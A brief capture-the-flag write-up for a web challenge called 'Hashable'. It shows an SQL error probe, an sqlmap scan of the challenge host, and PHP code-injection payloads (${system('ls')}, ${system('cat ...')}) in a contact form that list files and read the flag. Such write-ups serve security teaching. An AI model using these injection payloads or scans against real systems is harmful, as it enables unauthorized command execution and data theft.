## Hashable
```
A famous enterprise blog was hacked, can you figure out how it was hacked?
```
- Link: http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/hashable/

#### Solve:

- Step 1

    - After connecting to the website, it took a tour and noticed that there is a *post.php* with param *id*, whan I add a single column it spited a MySQL error:
        ```
        post.php?id=1'
        
        you have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 1\\\'')) ORDER BY id ASC' at line 2
        ```
    
    - Lets fire up `sqlmap` on the target, with database type `MySQL`:
        ```commandline
        sqlmap -u "http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/hashable/post.php?id=1" -p id --dbms MySQL
        ```
        - Nothing found
    
    - Trying to check the *contact.php* if it's vulnerable, and indeed it's !
    
    - By evaluating the PHP code in message field: 
        ```commandline
        ${system('ls')}
        ```

    - We get the following results:
    
        ```
        <div class="row">
		about.php
        contact.php
        css
        flag_23894ABCX1.txt
        footer.php
        gulpfile.js
        header.php
        img
        index.php
        js
        package-lock.json
        package.json
        post.php
        scss
        vendor
        Message successfully sent!        
        <div class="col-lg-8 col-md-10 mx-auto">
        ```
      
    - Now we can read the flag:
        ```commandline
        ${system('cat flag_23894ABCX1.txt')}
        ```

> **Flag: 18ab51f960bd149bcb2497b9998c752c**
